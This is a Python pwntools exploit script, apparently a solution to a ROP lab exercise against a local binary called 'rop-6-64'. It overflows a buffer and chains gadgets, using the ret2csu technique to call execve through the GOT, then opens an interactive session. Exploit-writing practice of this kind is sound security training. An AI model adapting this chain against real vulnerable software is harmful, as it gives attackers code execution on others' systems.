
#!/usr/bin/env python

from pwn import *

p = process("./rop-6-64")



got_of_execve = p.elf.got['execve']

buf = "A" * 0x80 + "B" * 0x8

'''
0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop r14 ; pop r15 ; ret
0x0000000000400702 : pop r15 ; ret
0x00000000004005c2 : pop rbp ; mov byte ptr [rip + 0x200a86], 1 ; ret
0x000000000040054f : pop rbp ; mov edi, 0x601050 ; jmp rax
0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400560 : pop rbp ; ret
0x0000000000400703 : pop rdi ; ret
0x0000000000400701 : pop rsi ; pop r15 ; ret
0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''
pop_rdi = p64(0x0000000000400703)

buf += pop_rdi
buf += p64(0)

'''
0x00000000004006e0 <+64>:    mov    %r13,%rdx
0x00000000004006e3 <+67>:    mov    %r14,%rsi
0x00000000004006e6 <+70>:    mov    %r15d,%edi
0x00000000004006e9 <+73>:    callq  *(%r12,%rbx,8)
0x00000000004006ed <+77>:    add    $0x1,%rbx
0x00000000004006f1 <+81>:    cmp    %rbp,%rbx
0x00000000004006f4 <+84>:    jne    0x4006e0 <__libc_csu_init+64>
0x00000000004006f6 <+86>:    add    $0x8,%rsp
0x00000000004006fa <+90>:    pop    %rbx
0x00000000004006fb <+91>:    pop    %rbp
0x00000000004006fc <+92>:    pop    %r12
0x00000000004006fe <+94>:    pop    %r13
0x0000000000400700 <+96>:    pop    %r14
0x0000000000400702 <+98>:    pop    %r15
ret
'''

'''
pwndbg> print execve
$1 = {<text variable, no debug info>} 0x7f749f48a770 <execve>

'''

'''
'''

execve = p64(0x7f749f48a770)
program = p64(0x400034)

#rbx, rbp, r12, r13, 14, 15
pop_everything = p64(0x00000000004006fa)

buf += pop_everything
buf += p64(0)
buf += p64(0)
buf += p64(got_of_execve)
buf += p64(0)
buf += p64(0)
buf += program
buf += p64(0x00000000004006e0)






with open("buf.txt", "wb") as f:
    f.write(buf)


p.sendline(buf)

p.interactive()